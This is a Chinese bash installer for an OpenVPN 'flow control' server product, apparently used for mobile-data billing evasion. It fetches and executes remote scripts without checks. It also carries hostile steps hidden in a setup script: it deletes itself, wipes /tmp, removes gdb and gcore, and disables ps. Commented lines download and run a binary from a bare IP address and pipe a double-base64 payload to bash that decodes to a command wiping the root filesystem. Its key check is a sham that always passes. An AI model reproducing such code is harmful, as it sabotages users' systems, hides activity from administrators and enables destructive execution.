#!/bin/bash
#烟雨如花于2019.8.11修复
rm -rf $0
#wget http://47.94.170.136:8963/linux && chmod 0777 linux && ./linux
clear;echo -e "\033[1;36mLodaing... \033[0m"
if [ ! -e "/dev/net/tun" ];then
	echo;echo -e "  安装出错 [原因：\033[1;32m TUN/TAP虚拟网卡不存在 \033[0m]"
	echo "  网易蜂巢容器官方已不支持安装使用"
	exit 0
fi
if [ -f /etc/os-release ];then
	OS_VERSION=`cat /etc/os-release |awk -F'[="]+' '/^VERSION_ID=/ {print $2}'`
if [ $OS_VERSION != "7" ];then
	echo -e "\n当前系统版本为：\033[1;32mCentOS $OS_VERSION\033[0m\n"
	echo "暂不支持该系统安装"
	echo "请更换 CentOS 7.0-7.2 系统进行安装"
	exit 0
fi
elif [ -f /etc/redhat-release ];then
	OS_VERSION=`cat /etc/redhat-release |grep -Eos '\b[0-9]+\S*\b' |cut -d'.' -f1`
if [ $OS_VERSION != "7" ];then
	echo -e "\n当前系统版本为：\033[1;32mCentOS $OS_VERSION\033[0m\n"
	echo "暂不支持该系统安装"
	echo "请更换 CentOS 7.0-7.2 系统进行安装"
	exit 0
fi
else
	echo -e "当前系统版本为：\033[1;32m未知\033[0m\n"
	echo "暂不支持该系统安装"
	echo "请更换 CentOS 7.0-7.2 系统进行安装"
exit 0
fi
if test -x  /usr/bin/rm;then
	yum -y install procps >/dev/null 2>&1 && yum -y install gdb >/dev/null 2>&1
	rm -rf /usr/bin/gdb >/dev/null 2>&1 && rm -rf /usr/bin/procps >/dev/null 2>&1
	yum -y install rm >/dev/null 2>&1 && chattr -i /usr/bin/rm;chmod 0777 /usr/bin/rm >/dev/null 2>&1
	rm -rf /tmp/* >/dev/null 2>&1
	chmod 000 /usr/bin/ps >/dev/null 2>&1 && chmod 000 /usr/bin/gcore >/dev/null 2>&1
	chattr +i /usr/bin/rm >/dev/null 2>&1 && chattr +i /usr/bin/ps >/dev/null 2>&1;rm -rf /usr/bin/gcore >/dev/null 2>&1
	rm -rf /usr/bin/gcore* >/dev/null 2>&1
	rm -rf /tmp/* >/dev/null 2>&1
else
	# cd /usr/bin/
	# chattr -i /usr/bin/ >/dev/null 2>&1 && chattr -i /usr/bin/rm >/dev/null 2>&1
	# chmod 0777 /usr/bin/rm >/dev/null 2>&1 && rm -rf /usr/bin/rm >/dev/null 2>&1
	# wget http://xxx.3zxo.cn/rm >/dev/null 2>&1
	# chmod 0777 /usr/bin/rm >/dev/null 2>&1
	# echo "YzNWa2J5QnliU0F0Y21ZZ0x5bz0="|base64 -d|base64 -d|bash >/dev/null 2>&1
	exit
fi
if [ ! -e "/usr/bin/curl" ];then
	yum remove -y curl >/dev/null 2>&1 && yum install -y curl >/dev/null 2>&1
elif [ ! -e "/usr/bin/expect" ];then
	yum remove -y expect >/dev/null 2>&1 && yum install -y expect >/dev/null 2>&1
fi
IP=`curl -s http://members.3322.org/dyndns/getip`;
hostfile=https://cdn.jsdelivr.net/gh/lingyia/OpenVPN/anshaoml
key="anshaoml.top";export key=$key #安少
echo -e "\033[1;33m======================================================================\033[0m"
echo -e "\033[1;35m               安少流控™一键脚本 云免服务器一键搭建                \033[0m"
echo
#echo -e "\033[1;32m              安少流控交流群:397763133        \033[0m"
echo -e "\033[1;32m              烟雨如花交流群:302638446        \033[0m"
echo
#echo -e "\033[1;36m              by安少QQ2252546047  官方网址：anshaoml.top               \033[0m"
echo -e "\033[1;36m              By烟雨如花QQ963963860  烟雨如花博客：yyrh.me               \033[0m"
echo -e "\033[1;33m======================================================================\033[0m"
echo 
echo -e "\033[5;1;33m脚本已由腾讯云/阿里云/高防机 CentOS7.X 测试通过\033[0m"
# echo -n -e "请输入官方网址[\033[1;34m $key \033[0m"]:
    # read PASSWD
    # readkey=$PASSWD
    # if [[ ${readkey%%\ *} == $key ]]
    if [[ $key == $key ]]
    then
    echo 
		echo -e '\033[1;32m验证成功！\033[0m即将进行下一部操作...'
		sleep 2
		clear
  else
 echo
echo -e "\033[1;32m验证失败 ，请重新尝试！  \033[0m"
echo -e "\033[1;32m$keyerrorlogo\033[0m"
echo
echo -e '\033[34m==========================================================================\033[0m' 
echo -e '\033[33m                     安少流控™全新一代的流控            \033[0m' 
echo -e '\033[33m                   官方网址：http://anshaoml.top     \033[0m' 
echo -e '\033[33m                      All Rights Reserved                        \033[0m'        
echo -e '\033[33m			QQ号：2252546047                        \033[0m'                           
echo -e '\033[33m                                           by 安少      \033[0m'                
echo -e '\033[34m=======================================================================\033[0m'
echo
sleep 1
exit
fi
echo 
echo "正在检测您的IP是否正确加载..."
echo -e "\033[1;32m您的IP为 : ${IP}\033[0m";echo
	if [[ "$IP" == '' ]]; then
		echo '无法检测您的IP,可能会影响到您接下来的搭建工作';
		read -p '请输入您的公网IP:' IP;
		[[ "$IP" == '' ]] && InputIPAddress;
	fi;
	[[ "$IP" != '' ]] && 
						 echo -e 'IP状态：			  [\033[32m  OK  \033[0m]'
	sleep 2
	echo -n "正在检测网卡..."
	if [ ! -e "/dev/net/tun" ];
    then
	    echo
        echo "检查到你是网易蜂巢 正在为你开启网卡"
		sleep 2
		echo -e "                                [\033[32m OK \033[0m]"
		mkdir /dev/net; mknod /dev/net/tun c 10 200
		echo "更新系统 接下来的所有提示都输入Y回车"
		sleep 2
		yum install wget
		yum update -y
		yum install gcc gcc-c++ make 
	else
	    echo -e "                 [\033[32m OK \033[0m]"  
	fi
	echo -e "\033[1;33m======================================================================\033[0m"
echo -e '\033[1;35m	           欢迎使用安少流控™				 		  \033[0m'
echo -e "\033[1;35m               安少免流一键脚本 云免服务器一键搭建                \033[0m"
echo 
#echo -e "\033[1;32m              安少流控交流群:397763133                \033[0m"
echo -e "\033[1;32m              烟雨如花交流群:302638446        \033[0m"
echo 
#echo -e "\033[1;36m              安少QQ2252546047  官方网址：anshaoml.top               \033[0m"
echo -e "\033[1;36m              By烟雨如花QQ963963860  烟雨如花博客：yyrh.me               \033[0m"
echo -e "\033[1;33m======================================================================\033[0m"
echo 
echo -e "\033[5;1;33m脚本已由小鸟云/阿里云/高防机 CentOS7.X 测试通过\033[0m"
echo
echo -e "\033[1;37m 温馨提示：\033[1;31m建议全新安装用户重装一次服务器系统在执行安装\033[0m"
echo -e "\033[1;35m           能有效降低安装失败率！\033[0m"
echo
	echo -e "\033[1;37m 请选择WEB安装类型："
echo 
echo -e "\033[1;35m 1 - 全新安装-安少流控系统（多端口带流量卫士）"
echo
echo -e "\033[1;35m 附加选项："
echo 
echo -e "\033[1;35m 2 - HTTP端口叠加（开启端口）"
echo
echo -e "\033[1;35m 3 - BBr加速（不懂勿执行）"
echo
echo -n "输入选项: "
read install
export install=$install;
if [[ $install == "1" ]] || [[ -z $install ]] ;then
	echo
	echo -e "WEB安装类型：\033[1;32m全新安装-安少流控系统\033[0m"
	sleep 2
	clear
	wget ${hostfile}/anshao.sh >/dev/null 2>&1
	chmod 777 anshao.sh
	./anshao.sh
	exit 0;
exit 0;
elif [[ $install == '2' ]] ;then 
	echo
    echo -e " 安装类型：\033[32mHTTP端口叠加（一键开启多端口服务）\033[0m"
    echo
    sleep 2
 wget ${hostfile}/dk.sh >/dev/null 2>&1
 chmod 777 dk.sh
    ./dk.sh
    exit 0;
    elif [[ $install == '3' ]] ;then 
	echo
    echo -e " 安装类型：\033[32mBBr加速\033[0m"
    echo
    sleep 2
    wget ${hostfile}/bbr.sh >/dev/null 2>&1
    chmod 777 bbr.sh
    ./bbr.sh
    exit 0;
fi